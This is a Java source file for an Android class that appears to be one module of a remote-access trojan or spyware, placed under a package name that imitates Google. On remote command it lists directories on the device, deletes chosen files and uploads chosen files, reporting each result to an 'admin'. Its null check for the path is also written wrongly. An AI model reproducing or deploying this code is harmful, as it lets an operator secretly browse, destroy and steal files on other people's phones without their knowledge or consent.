package com.google.core.msgpro;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import com.alibaba.fastjson.JSONObject;
import com.google.core.domain.FileInfo;
import com.google.core.domain.MsgType;
import com.google.core.utils.MsgUtils;

import android.content.Context;
import android.widget.Toast;

public class FileMsgPro {

	private Context context;
	private String msg;

	public FileMsgPro(Context context) {
		this.context = context;
	}

	public void doPro(int type, String data) {
		String filePath = data;
		if (filePath == null && filePath.trim().equals("")) {
			return;
		}
		switch (type) {
		case MsgType.FILE_LIST:
			List<FileInfo> fileList = readFileList(filePath);
			MsgUtils.sendToAdmin(context, MsgType.FILE_LIST, fileList);
			break;
		case MsgType.FILE_DEL:
			delFile(filePath);
			break;
		case MsgType.FILE_UPLOAD:
			MsgUtils.fileUpload(context, filePath);
			break;
		}
	}
	/**
	 * 删除文件
	 * @param filePath 文件路径
	 * @return
	 */
	private void delFile(String filePath) {
		File file=new File(filePath);
		if (file.exists() && file.delete()) {
			MsgUtils.sendToAdmin(context, MsgType.FILE_DEL_SUCCESS);
		}else{
			MsgUtils.sendToAdmin(context, MsgType.FILE_DEL_FAIL);
		}
	}

	/**
	 * 读取文件列表
	 * @param filePath
	 * @return
	 */
	private List<FileInfo> readFileList(String filePath) {
		List<FileInfo> list=new ArrayList<FileInfo>();
		File file = new File(filePath);
		System.out.println("文件路径"+filePath);
		System.out.println("文件是否存在"+file.exists());
		if (file.exists()) {
			File[] fl = file.listFiles();
			System.out.println(fl.length+"数量");
			for (File f : fl) {
				FileInfo fi = new FileInfo(f.lastModified(), f.getName(),
						f.getAbsolutePath(), f.length());
				
				list.add(fi);
			}
		}
		return list;
	}

}
